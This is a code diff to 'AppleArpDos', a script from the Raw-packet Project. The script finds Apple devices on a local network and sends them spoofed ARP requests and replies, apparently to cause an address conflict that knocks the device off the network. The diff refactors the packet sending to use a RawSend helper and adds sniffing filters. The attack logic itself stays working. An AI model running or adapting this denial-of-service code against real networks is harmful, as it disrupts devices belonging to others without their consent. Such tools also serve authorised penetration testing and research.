@@ -14,10 +14,9 @@ Copyright 2020, Raw-packet Project
 from raw_packet.Utils.base import Base
 from raw_packet.Scanners.scanner import Scanner
 from raw_packet.Scanners.arp_scanner import ArpScan
-from raw_packet.Utils.network import RawARP, RawSniff
+from raw_packet.Utils.network import RawARP, RawSniff, RawSend
 from raw_packet.Utils.tm import ThreadManager
 from argparse import ArgumentParser, RawTextHelpFormatter
-from socket import socket, AF_PACKET, SOCK_RAW
 from time import sleep
 from typing import Union, List, Dict
 # endregion
@@ -61,8 +60,7 @@ class AppleArpDos:
 
         # region Create raw socket
         self.network_interface = network_interface
-        self.raw_socket: socket = socket(AF_PACKET, SOCK_RAW)
-        self.raw_socket.bind((self.network_interface, 0))
+        self.raw_send: RawSend = RawSend(network_interface=self.network_interface)
         # endregion
 
         # region Set variables
@@ -104,9 +102,7 @@ class AppleArpDos:
                                                  sender_ip=self.apple_device_ip_address,
                                                  target_mac='00:00:00:00:00:00',
                                                  target_ip=random_ip_address)
-        for _ in range(count_of_packets):
-            self.raw_socket.send(arp_init_request)
-            sleep(0.5)
+        self.raw_send.send(packet=arp_init_request, count=count_of_packets, delay=0.5)
     # endregion
 
     # region ARP reply sender
@@ -117,7 +113,7 @@ class AppleArpDos:
                                            sender_ip=self.apple_device_ip_address,
                                            target_mac=self.apple_device_mac_address,
                                            target_ip=self.apple_device_ip_address)
-        self.raw_socket.send(arp_reply)
+        self.raw_send.send(packet=arp_reply)
         self.base.print_info('ARP response to: ', self.apple_device_ip_address, ' "' + self.apple_device_ip_address +
                              ' is at ' + self.your_mac_address + '"')
     # endregion
@@ -157,7 +153,10 @@ class AppleArpDos:
                          filters={'Ethernet': {'source': self.apple_device_mac_address},
                                   'ARP': {'opcode': 1},
                                   'IPv4': {'source-ip': '0.0.0.0', 'destination-ip': '255.255.255.255'},
-                                  'UDP': {'source-port': 68, 'destination-port': 67}})
+                                  'UDP': {'source-port': 68, 'destination-port': 67}},
+                         network_interface=self.network_interface,
+                         scapy_filter='arp or (udp and (port 67 or 68))',
+                         scapy_lfilter=lambda eth: eth.src == self.apple_device_mac_address)
     # endregion
 
 # endregion
@@ -168,13 +167,11 @@ def main():
 
     # region Init Raw-packet classes
     base: Base = Base()
-    scanner: Scanner = Scanner()
-    arp_scan: ArpScan = ArpScan()
     # endregion
 
     # region Check user and platform
     base.check_user()
-    base.check_platform()
+    base.check_platform(available_platforms=['Linux', 'Darwin'])
     # endregion
 
     try:
@@ -219,6 +216,8 @@ def main():
         assert last_ip_address is not None, \
             'Network interface: ' + base.error_text(str(listen_network_interface)) + \
             ' has not IPv4 address or network mask!'
+        arp_scan: ArpScan = ArpScan(network_interface=listen_network_interface)
+        scanner: Scanner = Scanner(network_interface=listen_network_interface)
         # endregion
 
         # region General output
@@ -237,8 +236,7 @@ def main():
                 '; Target IP address must be in range: ' + base.info_text(first_ip_address + ' - ' + last_ip_address)
             if args.target_mac is None:
                 base.print_info('Find MAC address of Apple device with IP address: ', args.target_ip, ' ...')
-                target_mac = arp_scan.get_mac_address(network_interface=listen_network_interface,
-                                                      target_ip_address=args.target_ip,
+                target_mac = arp_scan.get_mac_address(target_ip_address=args.target_ip,
                                                       exit_on_failure=True,
                                                       show_scan_percentage=False)
             else:
@@ -255,7 +253,7 @@ def main():
                 base.print_info('Find Apple devices in local network with ARP scan ...')
                 apple_devices: List[List[str]] = scanner.find_apple_devices_by_mac(listen_network_interface)
             else:
-                base.print_info('Find Apple devices in local network with nmap scan ...')
+                base.print_info('Find Apple devices in local network with NMAP scan ...')
                 apple_devices: List[List[str]] = scanner.find_apple_devices_with_nmap(listen_network_interface)
             apple_device = scanner.apple_device_selection(apple_devices=apple_devices, exit_on_failure=True)
         # endregion
